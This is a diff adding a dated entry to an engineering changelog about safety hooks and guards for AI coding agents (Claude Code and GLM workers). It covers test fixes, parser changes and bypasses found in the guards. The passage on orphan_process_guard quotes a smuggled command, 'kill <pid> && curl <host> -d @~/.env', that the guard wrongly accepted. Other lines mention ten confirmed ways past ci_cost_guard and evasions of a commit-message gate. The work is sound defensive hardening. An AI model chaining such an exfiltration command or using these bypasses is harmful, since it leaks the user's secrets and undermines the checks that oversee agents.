@@ -4,6 +4,56 @@ Summary log of terminal actions and outcomes. Full history archived in `archive/
 
 ---
 
+## 09/11/2026
+
+### CH-237 + CE-2: the controls refused what they claimed, and two of them could not fail
+
+| Time | Action | Result |
+|------|--------|--------|
+| - | Grace's review and two QA rounds drove CH-237.3/.4/.6/.7/.8 to accepted. Every fix is paired with a test proven to go red when the defect is restored | 245 hook tests, 619 ticket tests, 218 claude-env fixtures |
+| - | **CH-237.8 was a deadlock, not a hole.** Narrowing gate 4 to `-m`'s operand closed four evasions and made six of the eight spellings git accepts unreadable — `git commit -am "fix(X): real"` yielded an empty message and was refused for naming no ticket. QA bounced it twice; the second time found the parsing byte-identical to the bounced commit | Token-aware cluster parsing; `-c/-C/-t/-S/-u` operands still refused as messages |
+| - | **CH-237.6's tests could not fail.** They asserted on `permissionDecision`, a field that same story stopped the hook emitting. QA mutated the trigger back to the old broad regex and all six stayed green while the hook leaked its reminder onto `git log --grep commit` | Rewritten to assert silence; the mutation now reds 4 |
+| - | **CH-237.4 shipped with no instrument.** `FLAGS_TAKING_A_VALUE` grew four entries and reverting them produced zero failures across the whole suite | Four value-flag wrapper rows plus a read-only control; the revert now reds 4 |
+| - | CH-237.9: ci_cost_guard adopted the shared parser and resolves the target repo per statement. The permanent macOS ban had been chosen by whichever directory Claude Code started in | 25 fixtures; all four new BLOCK cases returned rc=0 against the pre-change guard |
+| - | CE-2.14/2.15: the worktree guard stopped crashing open on a non-string subagent_type, and the five roles its criterion names each got their own fixture. The old evidence was a `general-purpose` fixture that could not fail if a role were re-added | QA built six mutants and confirmed each fixture reds only for its own role |
+
+**A hole in a guard I wrote the same night, caught by CSO at the release gate:**
+`orphan_process_guard` prints one command to clear its block and promises that
+kill is the only thing allowed. `is_sweep` anchored the pattern at the start of
+the string, so `kill <pid> && curl <host> -d @~/.env` was accepted as a sweep.
+Three of four hostile forms passed. Worse than an ordinary bypass, because the
+guard hands the agent the command — it was not permitting the smuggler, it was
+dictating it. Fixed under CE-2.18 with a token allowlist (CE-2.17 stays
+accepted; Patrick: *"we don't re-open things like this"*).
+
+**GLM became a working second provider.** Z.AI's Anthropic-compatible endpoint
+through `glm-agent`. Board cards now show the model that actually served a run
+rather than the tier assigned at filing — `sonnet zai` described a worker that
+never existed. Up to five agents ran at once across two boards and two
+providers, GLM writing and reviewing while Claude verified. A GLM reviewer found
+ten real ways past ci_cost_guard; all ten confirmed by execution, all
+pre-existing, filed as CH-237.10.
+
+**Provider headroom is not interrogable.** Anthropic returns full
+`anthropic-ratelimit-*` headers; Z.AI returns none and has no quota endpoint —
+and the Anthropic numbers describe the API-key wallet, not the subscription
+dispatched workers spend from. No honest comparator exists. Confirmed
+separately that `api.z.ai/api/anthropic` is the Coding Plan endpoint, so GLM use
+draws on subscription quota and stops at exhaustion rather than falling through
+to wallet balance.
+
+**Filed, not fixed:** CH-237.10 (ten ci_cost_guard bypasses; four live in
+`_repo_context`, shared by 28 hooks, and hole #4 is pinned by an existing
+deliberate test — that one needs Patrick's call), CH-224.31 (the board gives no
+sign a worker is live on a story).
+
+**The lesson that cost the most time:** five stories' changes were batched into
+two working trees before anything was committed, so every commit tripped over
+another story's dirty files. The guards were working as designed — the docstring
+names that cost as accepted. Commit one story at a time.
+
+---
+
 ## 08/30/2026
 
 ### CE-5: eleven copies of the shared rules became one file (claude-env + 9 repos)
